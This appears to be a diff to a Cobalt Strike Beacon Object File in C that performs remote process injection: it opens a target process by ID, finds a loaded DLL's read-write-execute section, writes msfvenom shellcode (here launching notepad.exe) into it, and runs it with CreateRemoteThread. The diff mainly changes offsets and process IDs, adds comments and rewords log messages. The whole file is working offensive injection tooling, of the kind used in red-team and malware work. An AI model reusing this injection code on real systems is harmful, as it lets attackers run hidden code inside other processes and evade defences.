@@ -9,10 +9,10 @@ void ___chkstk_ms() { }
 
 // process and module definitions
 #define MODULE "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll" // change this based on dll of operator's choosing
-#define OFFSET  0x00000400 // change this based on dll of operator's choosing
-#define PROCESSID  30996 // change this based on running process with target module loaded
+#define OFFSET  0x001EC000 // change this based on dll of operator's choosing (testing 0x001EA800)
+#define PROCESSID  30436 // change this based on running process with target module loaded
 
-// kernel32 BOF definitions for beacon linking
+// BOF definitions for beacon linking
 WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
 WINADVAPI WINAPI PSAPI$EnumProcessModulesEx(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
 WINADVAPI WINAPI PSAPI$GetModuleFileNameExA(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);
@@ -41,6 +41,7 @@ void go(char * buff, int len)
     HMODULE                 hDll;
     PVOID                   rwxSection;
 
+    // msfvenom -p windows/x64/exec -a x64 --platform windows -f c cmd=notepad.exe
     unsigned char shellcode[] = 
         "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
         "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -67,16 +68,18 @@ void go(char * buff, int len)
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESSID);
     if (hProcess == NULL)
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to open process. Error Code: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Open Process. Error Code: %d\n", GetLastError());
         return 1;
     }
 
+    // enumerate remote modules, return array of handles
     if (!EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, dwFilter))
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to Enumerate Modules. Error Code: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Enumerate Modules. Error Code: %d\n", GetLastError());
         return 1;
     };
 
+    // interate over handle array and find module of operator's choosing
     for (INT i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
     {
         CHAR szModName[MAX_PATH];
@@ -90,34 +93,36 @@ void go(char * buff, int len)
         };
     };
 
+    // if no handle, die
     if (hDll == NULL)
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to find module\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Find Module: %d\n", GetLastError());
         return 1;
     };
-    BeaconPrintf(CALLBACK_OUTPUT, "Remote DLL address: %p\n", hDll);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote DLL Address: %p\n", hDll);
 
+    // calculate offset to RWX section 
     rwxSection = (PVOID)((ULONG_PTR)hDll + (ULONG_PTR)OFFSET);
-    BeaconPrintf(CALLBACK_OUTPUT, "Remote RWX section address: %p\n", rwxSection);
-    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode address: %p\n", shellcode);
-    BeaconPrintf(CALLBACK_OUTPUT, "Shellcode length: %d\n", sizeof(shellcode));
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote RWX Section Address: %p\n", rwxSection);
 
+    // write to RWX section
     if (!WriteProcessMemory(hProcess, rwxSection, shellcode, sizeof(shellcode), NULL))
     {
-        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %d\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] WriteProcessMemory Failed: %d\n", GetLastError());
         return 1;
     };
 
+    // create thread and run shellcode
     if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxSection, NULL, 0, NULL))
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to Create Thread in Remote Process and Execute. Error code: %lu\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Create Thread in Remote Process and Execute. Error Code: %d\n", GetLastError());
     }
     else
     {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode Successfully Executed in Remote Thread\n");
     }
 
-    // Close process and thread handles
+    // close handles
     CloseHandle(hProcess);
 
     return 0;
